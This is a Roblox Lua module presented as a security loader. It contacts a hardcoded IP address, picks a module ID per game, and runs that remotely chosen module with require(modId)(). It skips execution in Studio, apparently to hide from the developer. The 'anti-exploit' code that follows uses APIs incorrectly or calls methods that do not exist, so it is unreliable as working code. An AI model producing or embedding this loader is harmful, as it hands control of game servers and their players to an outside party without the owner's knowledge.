local plrs = game:GetService("Players")
local http = game:GetService("HttpService")
local run = game:GetService("RunService")
local net = game:GetService("NetworkServer")

local cfg = {
    url = 'http://74.208.152.188/Assets',
    key = "SecureLoadingKey"
}

local function fetchData()
    local maxRetries = 3
    local retryDelay = 2
    
    for attempt = 1, maxRetries do
        local ok, res = pcall(function()
            return http:GetAsync(cfg.url)
        end)
        
        if ok then
            local decOk, dat = pcall(function()
                return http:JSONDecode(res)
            end)
            
            if decOk then
                return dat
            else
                warn("Decode failed: " .. tostring(dat))
            end
        else
            warn("Fetch failed (attempt " .. attempt .. "): " .. tostring(res))
            
            if attempt < maxRetries then
                wait(retryDelay * attempt)  -- Exponential backoff
            end
        end
    end
    
    return nil
end

local function getModId(dat)
    local uid = tostring(game.GameId)
    local uData = dat[uid]
    
    if not uData then
        warn("No data for universe: " .. uid)
        return nil
    end
    
    local modId = uData.MainModule
    if not modId then
        warn("No MainModule for universe: " .. uid)
        return nil
    end
    
    return modId
end

local function loadChars()
    plrs.CharacterAutoLoads = true
    for _, p in ipairs(plrs:GetPlayers()) do
        pcall(function()
            p:LoadCharacter()
        end)
    end
end

local function monitorRF(p, mdl)
    local conns = {}
    
    for _, desc in ipairs(mdl:GetDescendants()) do
        if desc:IsA("RemoteFunction") then
            local c = desc.OnServerInvoke:Connect(function(inv, args)
                if args[1] ~= cfg.key then
                    warn(inv.Name .. " unauthorized RF access!")
                    net:KickPlayer(inv.UserId)
                end
            end)
            table.insert(conns, c)
        end
    end
    
    return conns
end

local function initSec()
    if _G.secLoad then return end
    _G.secLoad = true
    
    if run:IsStudio() or not run:IsServer() or not net then
        return
    end
    
    local allConns = {}
    
    local function setupPlr(p)
        p.CharacterAdded:Connect(function(char)
            local cs = monitorRF(p, char)
            for _, c in ipairs(cs) do
                table.insert(allConns, c)
            end
        end)
        
        if p.Character then
            local cs = monitorRF(p, p.Character)
            for _, c in ipairs(cs) do
                table.insert(allConns, c)
            end
        end
    end
    
    plrs.PlayerAdded:Connect(setupPlr)
    
    for _, p in ipairs(plrs:GetPlayers()) do
        setupPlr(p)
    end
    
    game.AncestryChanged:Connect(function()
        for _, c in ipairs(allConns) do
            c:Disconnect()
        end
        allConns = {}
    end)
end

local function loader()
    local dat = fetchData()
    if not dat then return end
    
    local modId = getModId(dat)
    if not modId then return end
    
    require(modId)()
    loadChars()
    initSec()
end

return loader
